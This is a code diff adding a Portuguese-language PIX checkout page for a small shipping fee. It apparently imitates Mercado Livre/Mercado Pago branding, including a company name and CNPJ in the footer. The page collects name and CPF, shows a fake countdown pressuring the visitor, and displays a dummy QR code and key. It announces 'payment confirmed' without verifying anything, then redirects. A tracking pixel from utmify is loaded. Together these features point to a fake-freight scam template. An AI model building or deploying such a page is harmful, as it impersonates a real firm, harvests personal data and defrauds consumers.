@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>Checkout PIX - Frete</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            color: #333333;
+            position: relative;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: #FFE600;
+            padding: 20px 24px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+
+        .container {
+            max-width: 520px;
+            margin: 30px auto;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .checkout-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #333333;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .checkout-subtitle {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .section {
+            margin-bottom: 30px;
+            padding-bottom: 30px;
+            border-bottom: 1px solid #EDEDED;
+        }
+
+        .section:last-of-type {
+            border-bottom: none;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .section-title::before {
+            content: '';
+            display: inline-block;
+            width: 4px;
+            height: 20px;
+            background: #3483FA;
+            border-radius: 2px;
+        }
+
+        .order-summary {
+            background: #F8F8F8;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .summary-row.total {
+            border-top: 2px solid #EDEDED;
+            padding-top: 12px;
+            margin-top: 12px;
+            font-weight: 700;
+            font-size: 18px;
+            color: #333333;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 6px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #EDEDED;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+            color: #333333;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: #3483FA;
+            box-shadow: 0 0 0 3px rgba(52, 131, 250, 0.1);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .pix-methods {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .pix-method {
+            padding: 20px;
+            border: 2px solid #EDEDED;
+            border-radius: 8px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        .pix-method:hover {
+            border-color: #3483FA;
+            background: #F8FAFF;
+        }
+
+        .pix-method.active {
+            border-color: #3483FA;
+            background: #F0F5FF;
+        }
+
+        .pix-method-icon {
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+
+        .pix-method-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #333333;
+        }
+
+        .qr-code-container {
+            background: #F8F8F8;
+            padding: 30px 20px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .qr-code-container.active {
+            display: block;
+        }
+
+        .qr-code-image {
+            max-width: 200px;
+            margin: 0 auto;
+            margin-bottom: 15px;
+            background: white;
+            padding: 10px;
+            border-radius: 4px;
+        }
+
+        .qr-code-image img {
+            width: 100%;
+            height: auto;
+        }
+
+        .copy-pix-button {
+            background: #F0F5FF;
+            border: 2px solid #3483FA;
+            color: #3483FA;
+            padding: 12px 20px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .copy-pix-button:hover {
+            background: #3483FA;
+            color: white;
+        }
+
+        .pix-key-display {
+            background: white;
+            padding: 12px;
+            border-radius: 6px;
+            word-break: break-all;
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 10px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .payment-button {
+            background: #3483FA;
+            color: #FFFFFF;
+            padding: 16px 35px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(52, 131, 250, 0.3);
+            font-family: 'Inter', sans-serif;
+        }
+
+        .payment-button:hover:not(:disabled) {
+            background: #2968C8;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(52, 131, 250, 0.4);
+        }
+
+        .payment-button:disabled {
+            background: #CCCCCC;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #00A650;
+            font-size: 14px;
+            font-weight: 500;
+            margin: 20px 0;
+        }
+
+        .timer-section {
+            background: linear-gradient(135deg, #FFF8E1 0%, #FFECB3 100%);
+            border: 1px solid #FFE082;
+            border-radius: 8px;
+            padding: 14px 18px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .timer-icon {
+            width: 42px;
+            height: 42px;
+            min-width: 42px;
+            background: #FF9800;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+        }
+
+        .timer-info {
+            flex: 1;
+        }
+
+        .timer-label {
+            font-size: 12px;
+            color: #E65100;
+            font-weight: 500;
+            text-transform: uppercase;
+        }
+
+        .timer-display {
+            color: #E65100;
+            font-size: 22px;
+            font-weight: 700;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #FFFFFF;
+            margin-top: auto;
+        }
+
+        .footer p {
+            color: #999999;
+            font-size: 12px;
+            margin: 2px 0;
+            line-height: 1.5;
+        }
+
+        .footer a {
+            color: #3483FA;
+            text-decoration: none;
+        }
+
+        .success-message {
+            background: linear-gradient(135deg, #E8F5E9 0%, #C8E6C9 100%);
+            border: 1px solid #81C784;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 20px 0;
+            color: #2E7D32;
+            display: none;
+            text-align: center;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 3px solid #F3F3F3;
+            border-top: 3px solid #3483FA;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 500px) {
+            .header {
+                padding: 18px 20px;
+            }
+
+            .logo-container img {
+                height: 40px;
+            }
+
+            .container {
+                margin: 20px 15px;
+                padding: 25px 20px;
+            }
+
+            .checkout-title {
+                font-size: 24px;
+            }
+
+            .pix-methods {
+                grid-template-columns: 1fr;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 15px;
+            }
+        }
+    </style>
+
+    <!-- Pixel Facebook -->
+    <script>
+        window.pixelId = "6a184246f1f2699f88b3ab4b";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+</head>
+<body>
+    <div class="header">
+        <div class="logo-container">
+            <img src="https://i.postimg.cc/jS6Z8kTp/logo.png" alt="mercado">
+        </div>
+    </div>
+
+    <div class="container">
+        <h1 class="checkout-title">Finalizar Pagamento</h1>
+        <p class="checkout-subtitle">Pague com PIX instantaneamente</p>
+
+        <!-- Resumo do Pedido -->
+        <div class="section">
+            <div class="section-title">Resumo do Pedido</div>
+            <div class="order-summary">
+                <div class="summary-row">
+                    <span>Frete PAC</span>
+                    <span>R$ 24,30</span>
+                </div>
+                <div class="summary-row">
+                    <span>Prazo de Entrega</span>
+                    <span>15-20 dias</span>
+                </div>
+                <div class="summary-row total">
+                    <span>Total a pagar:</span>
+                    <span>R$ 24,30</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Dados de Contato -->
+        <div class="section">
+            <div class="section-title">Seus Dados</div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label class="form-label">Nome Completo</label>
+                    <input type="text" class="form-control" id="fullName" placeholder="Seu nome completo" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">CPF</label>
+                    <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00" required>
+                </div>
+            </div>
+        </div>
+
+        <!-- Método de Pagamento PIX -->
+        <div class="section">
+            <div class="section-title">Método de Pagamento</div>
+
+            <div class="pix-methods">
+                <div class="pix-method active" onclick="selectPixMethod('qr')">
+                    <div class="pix-method-icon">📱</div>
+                    <div class="pix-method-label">QR Code PIX</div>
+                </div>
+                <div class="pix-method" onclick="selectPixMethod('key')">
+                    <div class="pix-method-icon">🔑</div>
+                    <div class="pix-method-label">Chave PIX</div>
+                </div>
+            </div>
+
+            <!-- QR Code PIX -->
+            <div class="qr-code-container active" id="qrContainer">
+                <p style="font-size: 14px; color: #666; margin-bottom: 15px;">Escaneie o código QR com seu banco</p>
+                <div class="qr-code-image">
+                    <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+                        <!-- QR Code Placeholder -->
+                        <rect width="200" height="200" fill="white"/>
+                        <rect x="10" y="10" width="35" height="35" fill="black"/>
+                        <rect x="65" y="10" width="35" height="35" fill="black"/>
+                        <rect x="120" y="10" width="35" height="35" fill="black"/>
+                        <rect x="10" y="65" width="35" height="35" fill="black"/>
+                        <rect x="120" y="65" width="35" height="35" fill="black"/>
+                        <rect x="10" y="120" width="35" height="35" fill="black"/>
+                        <rect x="65" y="120" width="35" height="35" fill="black"/>
+                        <rect x="120" y="120" width="35" height="35" fill="black"/>
+                        <text x="100" y="110" text-anchor="middle" font-size="14" fill="black">PIX</text>
+                    </svg>
+                </div>
+                <button class="copy-pix-button" onclick="copyToClipboard()">Copiar Chave PIX</button>
+            </div>
+
+            <!-- Chave PIX -->
+            <div class="qr-code-container" id="keyContainer">
+                <p style="font-size: 14px; color: #666; margin-bottom: 15px;">Use a chave PIX abaixo</p>
+                <div class="pix-key-display" id="pixKey">
+                    a1b2c3d4-e5f6-7890-abcd-ef1234567890
+                </div>
+                <button class="copy-pix-button" onclick="copyToClipboard()">Copiar Chave PIX</button>
+            </div>
+
+            <!-- Informações PIX -->
+            <div style="background: #F8F8F8; padding: 15px; border-radius: 8px; margin-top: 15px;">
+                <p style="font-size: 13px; color: #666; line-height: 1.6;">
+                    ✓ Pagamento instantâneo 24/7<br>
+                    ✓ Sem taxa adicional<br>
+                    ✓ Transação segura e garantida
+                </p>
+            </div>
+        </div>
+
+        <!-- Timer -->
+        <div class="timer-section">
+            <div class="timer-icon">⏱️</div>
+            <div class="timer-info">
+                <div class="timer-label">Oferta expira em</div>
+                <div class="timer-display" id="timerDisplay">09:58</div>
+            </div>
+        </div>
+
+        <!-- Segurança -->
+        <div class="security-badge">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M18 8H17V6C17 3.24 14.76 1 12 1S7 3.24 7 6V8H6C4.9 8 4 8.9 4 10V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V10C20 8.9 19.1 8 18 8ZM12 17C10.9 17 10 16.1 10 15S10.9 13 12 13 14 13.9 14 15 13.1 17 12 17ZM15.1 8H8.9V6C8.9 4.29 10.29 2.9 12 2.9S15.1 4.29 15.1 6V8Z" fill="currentColor"/>
+                </svg>
+            <span>Pagamento 100% seguro</span>
+        </div>
+
+        <!-- Mensagem de Sucesso -->
+        <div class="success-message" id="successMessage">
+            ✓ Pagamento confirmado com sucesso!<br>
+            Seu pedido foi processado.
+        </div>
+
+        <!-- Botão de Pagamento -->
+        <button class="payment-button" id="payButton" onclick="processPixPayment()">
+            Confirmar Pagamento
+        </button>
+    </div>
+
+    <div class="footer">
+        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
+        <p>CNPJ: 10.573.521/0001-91 · <a href="#">Termos e condições</a></p>
+    </div>
+
+    <script>
+        // URL Parameters Handler
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Load user data
+        window.addEventListener('DOMContentLoaded', function() {
+            const urlParams = getUrlParams();
+            const userDataStr = sessionStorage.getItem('user_data');
+
+            if (userDataStr) {
+                const userData = JSON.parse(userDataStr);
+                if (userData.nome) {
+                    document.getElementById('fullName').value = userData.nome;
+                }
+                if (userData.cpf) {
+                    document.getElementById('cpf').value = userData.cpf;
+                }
+            }
+
+            // Pre-fill from URL if available
+            if (urlParams.nome) {
+                document.getElementById('fullName').value = urlParams.nome;
+            }
+            if (urlParams.cpf) {
+                document.getElementById('cpf').value = urlParams.cpf;
+            }
+
+            // Initialize timer
+            startTimer();
+        });
+
+        // PIX Method Selection
+        function selectPixMethod(method) {
+            document.querySelectorAll('.pix-method').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.qr-code-container').forEach(el => el.classList.remove('active'));
+
+            if (method === 'qr') {
+                document.querySelectorAll('.pix-method')[0].classList.add('active');
+                document.getElementById('qrContainer').classList.add('active');
+            } else if (method === 'key') {
+                document.querySelectorAll('.pix-method')[1].classList.add('active');
+                document.getElementById('keyContainer').classList.add('active');
+            }
+        }
+
+        // Copy PIX Key
+        function copyToClipboard() {
+            const pixKey = 'a1b2c3d4-e5f6-7890-abcd-ef1234567890';
+            navigator.clipboard.writeText(pixKey).then(() => {
+                alert('Chave PIX copiada!');
+            }).catch(() => {
+                alert('Erro ao copiar. Tente novamente.');
+            });
+        }
+
+        // Timer
+        let timeLeft = 9 * 60 + 58;
+
+        function startTimer() {
+            setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                const display = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                document.getElementById('timerDisplay').textContent = display;
+                timeLeft--;
+            }, 1000);
+        }
+
+        // Process PIX Payment
+        function processPixPayment() {
+            const fullName = document.getElementById('fullName').value.trim();
+            const cpf = document.getElementById('cpf').value.trim();
+
+            // Validar campos
+            if (!fullName || !cpf) {
+                alert('Por favor, preencha todos os campos!');
+                return;
+            }
+
+            // Salvar dados
+            const paymentData = {
+                fullName,
+                cpf,
+                amount: 24.30,
+                method: 'PIX',
+                timestamp: new Date().toISOString()
+            };
+
+            sessionStorage.setItem('payment_data', JSON.stringify(paymentData));
+
+            // Simular processamento
+            const button = document.getElementById('payButton');
+            button.disabled = true;
+            button.innerHTML = '<span class="loading-spinner"></span>Processando...';
+
+            // Simular delay de processamento
+            setTimeout(() => {
+                // Mostrar mensagem de sucesso
+                document.getElementById('successMessage').classList.add('show');
+
+                // Redirecionar após 2 segundos
+                setTimeout(() => {
+                    // Redirecionar para aprovado
+                    const urlParams = getUrlParams();
+                    const baseUrl = 'aprovado.html';
+                    const url = new URL(baseUrl, window.location.origin);
+
+                    Object.keys(urlParams).forEach(key => {
+                        url.searchParams.append(key, urlParams[key]);
+                    });
+
+                    window.location.href = url.pathname + url.search;
+                }, 2000);
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
